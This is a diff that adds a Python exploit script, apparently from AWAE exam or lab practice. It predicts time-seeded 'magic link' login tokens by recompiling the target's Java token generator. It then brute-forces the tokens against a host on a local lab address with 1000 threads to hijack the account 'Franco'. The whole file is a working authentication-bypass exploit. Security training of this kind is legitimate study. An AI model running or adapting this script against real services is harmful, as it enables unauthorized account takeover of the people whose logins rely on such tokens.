@@ -1,0 +1,86 @@
+#!/usr/bin/python3
+# Based on scripts exploit a module in AWAE
+# Author: donguyen269
+from http.cookiejar import Cookie
+import subprocess, time, requests, sys, concurrent.futures
+from xmlrpc.client import Boolean
+
+proxies = {
+    "http":"127.0.0.1:8080",
+    "https":"127.0.0.1:8080"
+}
+
+def gen_token(start, end):
+    java_content = """
+import java.util.Base64;
+import java.util.Random;
+
+public class TokenUtil {
+  public static final String CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz";
+  
+  public static final String NUMBERS = "1234567890";
+  
+  public static final String SYMBOLS = "!@#$%^&*()";
+  
+  public static final String CHARSET = "abcdefghijklmnopqrstuvwxyz" + "abcdefghijklmnopqrstuvwxyz".toUpperCase() + "1234567890" + "!@#$%^&*()";
+  
+  public static final int TOKEN_LENGTH = 42;
+  
+  public static String createToken(int userId, long myInput) {
+    Random random = new Random(myInput);
+    StringBuilder sb = new StringBuilder();
+    byte[] encbytes = new byte[42];
+    for (int i = 0; i < 42; i++)
+      sb.append(CHARSET.charAt(random.nextInt(CHARSET.length()))); 
+    byte[] bytes = sb.toString().getBytes();
+    for (int j = 0; j < bytes.length; j++)
+      encbytes[j] = (byte)(bytes[j] ^ (byte)userId); 
+    return Base64.getUrlEncoder().withoutPadding().encodeToString(encbytes);
+  }
+
+  public static void main(String[] args){
+    TokenUtil tokenUtil = new TokenUtil();
+    long start = Long.parseLong(args[0]);
+    long end = Long.parseLong(args[1]);
+    for(long i = start; i < end; i++){
+        System.out.println(tokenUtil.createToken(8, i));
+    }
+  }
+} 
+    """
+    with open('TokenUtil.java', 'w') as f:
+        f.write(java_content)
+        f.close()
+    
+    #compile java
+    subprocess.run("javac TokenUtil.java".split())
+    #run java and return
+    # start -= 23000
+    # end -= 21000
+    return subprocess.run(("java TokenUtil {} {}".format(start, end)).split(), stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+data= {
+    "username":"Franco"
+}
+
+start = round(time.time()*1000)
+requests.post("http://192.168.191.251/generateMagicLink", data=data) #change this
+end = round(time.time()*1000)
+
+list_token = gen_token(start, end).split()
+
+finalresult = False
+def try_magic_link(token):
+    r = requests.get("http://192.168.191.251/magicLink/{}".format(token.strip()), allow_redirects=False)
+    significant = r.headers.get('Set-Cookie')
+    if(significant != None):
+        print("Success!!")
+        global finalresult
+        finalresult=True
+
+#Multithread 
+with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
+    threads = executor.map(try_magic_link, list_token)
+    
+if(finalresult == False):
+    print("Fail")
